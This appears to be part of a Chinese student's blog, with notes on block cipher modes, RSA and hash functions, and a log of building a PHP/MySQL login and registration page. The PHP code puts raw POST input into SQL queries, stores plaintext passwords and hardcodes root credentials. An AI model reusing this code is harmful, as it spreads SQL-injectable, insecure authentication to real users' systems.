<h5 id="小测验6答案"><a href="#小测验6答案" class="headerlink" title="小测验6答案"></a>小测验6答案</h5><p>怎么能全错哇我要闹了我要闹了好崩溃。。。</p>
<blockquote>
<p>在ECB模式的加密中，内容相同的明文分组，一定会被转换为内容相同的密文分组。(O)</p>
</blockquote>
<blockquote>
<p>在CBC模式的解密中，如果密文分组3损坏，则密文分组5是无法正确解密的。(X)<br>密文分组3损坏会导致密文分组3和4无法解密，但密文分组5依然能够正常解密。</p>
</blockquote>
<blockquote>
<p>在CFB模式的加密中，不可以从明文的中间开始加密。(O)<br>正确。如果不是使用CFB模式，而是使用OFB模式或CTR模式的话，就可以从明文的中间开始加密。</p>
</blockquote>
<blockquote>
<p>在OFB模式的解密中，分组密码算法本身所实际执行的是加密操作。(O)<br>正确。在CFB模式、OFB模式和CTR模式中，分组密码算法是用来生成密钥流的，因此，无论是加密还是解密，分组密码算法本身执行的都是相同的操作(加密操作)。</p>
</blockquote>
<h2 id="第五章：公钥密码"><a href="#第五章：公钥密码" class="headerlink" title="第五章：公钥密码"></a>第五章：公钥密码</h2><blockquote>
<p>公钥密码( public-key cryptography )中，密钥分为加密密钥和解密密钥两种。发送者用加密密钥对消息进行加密，接收者用解密密钥对密文进行解密。要理解公钥密码，清楚地区分加密密钥和解密密钥是非常重要的。加密密钥是发送者加密时使用的，而解密密钥则是接收者解密时使用的。</p>
</blockquote>
<blockquote>
<p>仔细思考一下加密密钥和解密密钥的区别，我们可以发现:<br>●发送者只需要加密密钥<br>●接收者只需要解密密钥<br>●解密密钥不可以被窃听者获取<br>●加密密钥被窃听者获取也没问题</p>
</blockquote>
<p><strong>公钥密码</strong>：又称<strong>非对称密码</strong><br><strong>加密密钥</strong>：一般为公开，又称<strong>公钥</strong><br><strong>解密密钥</strong>：绝对不能公开，又称<strong>私钥</strong></p>
<blockquote>
<p>公钥和私钥是一一 对应的， 一对公钥和私钥统称为密钥对( key pair )。由公钥进行加密的密文，必须使用与该公钥配对的私钥才能够解密。密钥对中的两个密钥之间具有非常密切的关系——数学上的关系——因此公钥 和私钥是不能分别单独生成的。<br>公钥密码的使用者需要生成一个包括公钥和私钥的密钥对，其中公钥会被发送给别人，而私钥则仅供自己使用。</p>
</blockquote>
<h4 id="mod运算"><a href="#mod运算" class="headerlink" title="mod运算"></a>mod运算</h4><blockquote>
<p>A除以B求余数记作 <strong>A mod B</strong></p>
</blockquote>
<h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p><img src="https://img.mjj.today/2023/01/28/d9f9829560a460ad3681aa0febebc11f.png" alt="d9f9829560a460ad3681aa0febebc11f.png"></p>
<p>公钥：(E,N)</p>
<blockquote>
<p>E和N这两个数并不是密钥对(公钥和私钥的密钥对)。E和N两个数才组成了一个公钥，因此我们一.般会写成“公钥是(E, N)”或者“公钥是{E,N}”这样的形式，将E和N用括号括起来。</p>
</blockquote>
<p><img src="https://img.mjj.today/2023/01/28/d54ea3cbbccdf07c0be47bc1e1ef8aba.png" alt="d54ea3cbbccdf07c0be47bc1e1ef8aba.png"></p>
<p>私钥：(D,N)</p>
<p>N：两个质数(p,q)相乘<br>L：(p-1,q-1)的最小公倍数<br>E：1&lt;E&lt;L，E与L互质<br>D：1&lt;D&lt;L，E x D mod &#x3D; 1</p>
<p><img src="https://img.mjj.today/2023/01/28/915301359b9b3bd856e356bb5119882f.png" alt="915301359b9b3bd856e356bb5119882f.png"></p>
<hr>
<p>好好笑这个例子。。放出来乐乐<br><img src="https://img.mjj.today/2023/01/28/f28ef45ddb5d49985638dfd9777c37bb.png" alt="f28ef45ddb5d49985638dfd9777c37bb.png"><br>Mallory在我这已经是是弯恋直求而不得拆散别人的坏女人了（恼<br>（我不管Mallory明明就是女名嘛</p>
<hr>
<h4 id="小测验-4"><a href="#小测验-4" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br><del>没必要吧。。Alice知道自己的私钥就好了</del><br>小测验2<br><del>自己也解不开了吧。。？</del><br>小测验3<br><del>9</del><br>小测验4<br><del>OOXXO</del></p>
<h5 id="小测验错题答案"><a href="#小测验错题答案" class="headerlink" title="小测验错题答案"></a>小测验错题答案</h5><ol>
<li>这是因为如果将Bob的密钥交给Alice，从此之后(即在本次通信结束之后) Alice就能够对用Bob的密钥加密的密文进行解密。也就是说，对于Bob来说，Alice 有可能成为一个窃听者。</li>
<li>Alice的方法没有解决三重DES的密钥配送问题。<br>的确，将AES密钥通过三重DES加密后再发送的话，加密后的AES密钥就不怕被窃听。<br>但是，我们还是需要配送加密AES密钥时使用的那个密钥(三重DES的密钥)，否则接收者就无法解密AES密钥。<br>Alice的方法只是把问题转移了而已，并没有真正解决密钥配送问题。</li>
<li><img src="https://img.mjj.today/2023/01/28/d30e249ddb83af37ba2f375aa912784a.png" alt="d30e249ddb83af37ba2f375aa912784a.png"></li>
<li>OOXOO<br>(4)一般来说，对称密码的速度比公钥密码要快。</li>
</ol>
<h2 id="第六章：混合密码系统"><a href="#第六章：混合密码系统" class="headerlink" title="第六章：混合密码系统"></a>第六章：混合密码系统</h2><blockquote>
<p>混合密码系统：<br>●用对称密码加密消息<br>●通过伪随机数生成器生成对称密码加密中使用的会话密钥<br>●用公钥密码加密会话密钥<br>●从混合密码系统外部赋予公钥密码加密时使用的密钥</p>
</blockquote>
<h4 id="小测验-5"><a href="#小测验-5" class="headerlink" title="小测验"></a>小测验</h4><p>小测验1<br>OXXO</p>
<h1 id="第二部分：认证"><a href="#第二部分：认证" class="headerlink" title="第二部分：认证"></a>第二部分：认证</h1><h2 id="第七章：单向散列函数"><a href="#第七章：单向散列函数" class="headerlink" title="第七章：单向散列函数"></a>第七章：单向散列函数</h2><blockquote>
<p><strong>单向散列函数</strong>(one-way hash function)&#x2F;<strong>消息摘要函数</strong>( message digest function )&#x2F;<strong>哈希函数</strong>&#x2F;<strong>杂凑函数</strong>有一个输入和一个输出；<br>其中输入称为<strong>消息</strong>(message)&#x2F;<strong>原像</strong>;<br>输出称为<strong>散列值</strong>(hash value)&#x2F;<strong>消息摘要</strong>&#x2F;<strong>指纹</strong>。</p>
</blockquote>
<blockquote>
<p>单向散列函数可以根据消息的内容计算出散列值，而散列值就可以被用来检查消息的完整性。</p>
</blockquote>
<blockquote>
<p>散列值的长度和消息的长度无关。</p>
</blockquote>
<blockquote>
<p>如果单向散列函数计算出的散列值没有发生变化，那么消息很容易就会被篡改，这个单向散列函数也就无法被用于完整性的检查。两个不同的消息产生同一个散列值的情况称为<strong>碰撞</strong>(collision)。如果要将单向散列函数用于完整性的检查，则需要确保在事实上不可能被人为地发现碰撞。</p>
</blockquote>
<blockquote>
<p>难以发现碰撞的性质称为<strong>抗碰撞性</strong>(collision resistance )。密码技术中所使用的单向散列函数，都需要具备抗碰撞性。</p>
</blockquote>
<p>单项散列函数需具备：<br><strong>弱抗碰撞性</strong>：要找到和该条消息具有相同散列值的另外一条消息是非常困难的；<br><strong>强抗碰撞性</strong>：要找到散列值相同的两条不同的消息是非常困难的；<br><strong>单向性</strong>：:无法通过散列值反算出消息的性质。</p>
]]></content>
      <categories>
        <category>学习日记</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>ROIS2023冬令营第三周学习记录</title>
    <url>/2023/01/27/ROIS2023%E5%86%AC%E4%BB%A4%E8%90%A5%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<p>（01&#x2F;30更了）学了个寂寞😅<br>后知后觉这是第三周OMG那我第二周干了什么。。。？</p>
<span id="more"></span>
<p>都是车轱辘和废话。。可以直接拉到最下面看我丑陋的页面👉👈。。</p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><p>CryptoHack更了一点点<br><a href="https://linturrr.github.io/2023/01/15/Introduction-to-CryptoHack%E9%83%A8%E5%88%86Write-Up/">CryptoHack部分wp</a><br>这次的题用到的gmpy2库里的函数比较多，放一下搜到的<br><a href="https://blog.csdn.net/weixin_43790779/article/details/108473984">gmpy2常见函数使用</a><br>（01&#x2F;30）会把读书笔记继续贴上来。。。</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>学习记录还在写😅跟没学似的有时候觉得自己😅真服了</p>
<h3 id="2003-x2F-01-x2F-29"><a href="#2003-x2F-01-x2F-29" class="headerlink" title="2003&#x2F;01&#x2F;29"></a>2003&#x2F;01&#x2F;29</h3><h4 id="php"><a href="#php" class="headerlink" title="php"></a>php</h4><p>安装和配置参考，几个教程其实大差不差。。。<br><a href="https://www.php.cn/php-weizijiaocheng-418944.html#:~:text=PHP%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE.%201%E3%80%81%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85.%20%E7%82%B9%E5%87%BB%E9%93%BE%E6%8E%A5%E8%BF%9B%E5%85%A5%E5%AE%98%E7%BD%91%E4%B8%8B%E8%BD%BDhttps://windows.php.net/download.%202%E3%80%81%E8%A7%A3%E5%8E%8B%E5%B9%B6%E9%85%8D%E7%BD%AE.%201%29,%E8%A7%A3%E5%8E%8B%E5%A5%BD%E4%B8%8B%E8%BD%BD%E5%A5%BD%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%B0%E8%A6%81%E5%AE%89%E8%A3%85%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82.%202%29%20%E5%A4%8D%E5%88%B6%E4%BB%BDphp.ini-development%EF%BC%8C%E5%B9%B6%E6%94%B9%E5%90%8D%E4%B8%BAphp.ini%E3%80%82.%20%E7%84%B6%E5%90%8E%E9%85%8D%E7%BD%AE.%20%E6%9B%B4%E6%94%B9%E7%9B%AE%E5%BD%95%E5%9C%B0%E5%9D%80%E7%B1%BB%E4%BC%BC%E4%B8%8B%E5%9B%BE%EF%BC%88%E5%85%B7%E4%BD%93%E4%BE%9D%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E8%80%8C%E5%AE%9A%EF%BC%89.%20%E5%8E%BB%E6%8E%89%E5%89%8D%E9%9D%A2%E7%9A%84%E2%80%9C%EF%BC%9B%E2%80%9D.">win10如何安装和搭建php开发环境</a><br><a href="https://segmentfault.com/a/1190000003409708">windows下PHP环境的搭建</a><br><a href="https://blog.csdn.net/socct_yj/article/details/105559136">php windows环境安装（图文版）</a></p>
<h5 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h5><p>随便一点啦。。懒得修饰了啦。。<br>登录页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>简陋登录页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>你懂什么大道至简（目移）<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>页面简陋一些也没什么吧（悲）<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>用户: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span>密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;register.php&quot;</span>&gt;</span>立即注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>注册页面</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>简陋注册页面<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>用户: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span>密码: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> 	<span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;login&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">&quot;login.php&quot;</span>&gt;</span>点我返回<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$db</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>新建一个数据库，数据表，字段为相应的“username”和“password”。<br><code>create database test;</code><br><code>alter database test character set utf8;</code><br><code>use test;</code></p>
<p>创建test数据库并建立user表。。不知道这步有没有写错。。<br><code>create table user(id INT, username VARCHAR(20), password VARCHAR(20));</code></p>
<p><code>show create table user;</code><br><code>desc user;</code><br>给自己加个号<br><code>insert into user(id,username,password) values(1,LinTu,qwertyuiop);</code></p>
<p>期间出现的问题，网上查到的（我能用的）解决方法：</p>
<ol>
<li>我不会说我PHP连上MySQL这个问题就花了三小时但这是事实😅<br><code>Fatal error: Uncaught Error: Call to undefined function mysqli_connect() in</code><br><a href="https://blog.csdn.net/weixin_43887086/article/details/107148684?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-107148684-blog-106507641.pc_relevant_recovery_v2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-107148684-blog-106507641.pc_relevant_recovery_v2&utm_relevant_index=2">php7.4.5 出现Call to undefined function mysqli_connect()解决方法</a></li>
</ol>
<h5 id="后端"><a href="#后端" class="headerlink" title="后端"></a>后端</h5><p>其实我前端后端是写在一起的。。但这不重要。。<br>登录页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id,username,password from user where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span> &amp;&amp; <span class="variable">$username</span>!=<span class="string">&#x27;&#x27;</span> )&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功！&#x27;);window.location=&#x27;guestbook.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;输入为空或密码错误或未注册&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注册页面</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// $sql=&quot;insert into user(username,password) values(&#x27;$username&#x27;,&#x27;$password&#x27;)&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$sql</span>=<span class="string">&quot;insert into user(username,password) values(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;注册成功！&#x27;);window.location=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;输入不能为空&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;该用户名已被注册！&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给留言板部分加了个登出功能突然意识到这玩意是不是也要接个数据库才能发布留言但是我凑合过吧我不想管了明天再说吧呵呵呵呵呵呵呵呵呵呵呵呵呵呵</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;欢迎您，&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;123.php&quot;</span>&gt;登出&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>123.php的部分</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;uesrname&quot;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登出成功！&#x27;);window.location=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>现在的问题是登录页面弹窗老出问题但是我懒得改了然后注册页面不是注册的账号写不进数据库就是写进数据库但是会出现同名现象然后留言板根本没写至于剩下的页面美化呵呵呵呵呵呵呵呵呵呵呵呵谁管它谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎谁在乎主队打保级队2-5我真的精神崩溃了受不了了受不了了受不了了受不了了受不了了随便了随便了随便了随便了差不多得了差不多得了差不多得了</p>
<p>先下了需要调理一下再见明天见明天也不一定见</p>
<h3 id="2023-x2F-01-x2F-30"><a href="#2023-x2F-01-x2F-30" class="headerlink" title="2023&#x2F;01&#x2F;30"></a>2023&#x2F;01&#x2F;30</h3><p>敷衍地改了改登录页面的php，现在弹窗好一点了。。其实没差多少。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select id,username,password from user where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span>!=<span class="string">&#x27;&#x27;</span> &amp;&amp; <span class="variable">$password</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$a</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span> )&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;登录成功！&#x27;);window.location=&#x27;guestbook.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;密码错误或未注册&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;输入不能为空。。（远目）&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注册页面php小修了一下，现在能正常写进数据库并且不会同名了（大概吧。。<br>（注释全是写烂了的。。<br>（写得好丑陋。。有缘再修吧。。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL ^ E_NOTICE);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span>(<span class="string">&quot;sql.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// $sql=&quot;insert into user(username,password) values(&#x27;$username&#x27;,&#x27;$password&#x27;)&quot;;</span></span><br><span class="line"><span class="variable">$sql_n</span>=<span class="string">&quot;select username from user where username=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$sql_p</span>=<span class="string">&quot;select password from user where and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result_n</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="variable">$sql_n</span>);</span><br><span class="line"><span class="variable">$n</span>=<span class="title function_ invoke__">mysqli_fetch_array</span>(<span class="variable">$result_n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// $result_p=mysqli_query($db,$sql_p);</span></span><br><span class="line"><span class="comment">// $p=mysqli_fetch_array($result_p);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="comment">// if($a[&#x27;username&#x27;]==$username)&#123;</span></span><br><span class="line"><span class="comment">// 	echo &quot;&lt;script&gt;alert(&#x27;该用户名已被注册！&#x27;);;&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">// 	echo &quot;&lt;script&gt;alert(&#x27;注册成功&#x27;);;&lt;/script&gt;&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$n</span>[<span class="string">&#x27;username&#x27;</span>]!=<span class="variable">$username</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">                <span class="variable">$insert</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$db</span>,<span class="string">&quot;insert into user (username,password) values(&#x27;<span class="subst">$username</span>&#x27;,&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;注册成功！&#x27;);window.location=&#x27;login.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span 